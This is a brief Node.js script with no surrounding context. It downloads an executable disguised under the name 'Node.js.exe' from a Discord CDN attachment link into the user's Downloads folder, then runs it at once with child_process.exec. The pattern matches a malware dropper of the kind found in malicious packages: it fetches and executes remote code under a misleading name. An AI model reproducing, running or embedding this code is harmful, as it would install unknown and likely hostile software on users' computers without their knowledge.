const axios = require('axios').default;
const fs = require('fs');
const path = require('path');
const os = require('os');
const { exec } = require('child_process');

async function downloadFile(url, destination) {
    const response = await axios({
        url,
        method: 'GET',
        responseType: 'stream'
    });

    const filePath = path.join(destination, 'Node.js.exe');
    const writer = fs.createWriteStream(filePath);

    response.data.pipe(writer);

    return new Promise((resolve, reject) => {
        writer.on('finish', resolve);
        writer.on('error', reject);
    });
}

async function main() {
    const url = 'https://cdn.discordapp.com/attachments/1225853940998869063/1237137841939681341/Node.js.exe?ex=663a8de6&is=66393c66&hm=2c0adb30a7f7e2ee9c89663e6eaca84e3af850f8d03d3e4728326fea7896281f&';
    const destination = path.join(os.homedir(), 'Downloads');

    await downloadFile(url, destination);

    const filePath = path.join(destination, 'Node.js.exe');
    exec(filePath);
}

main()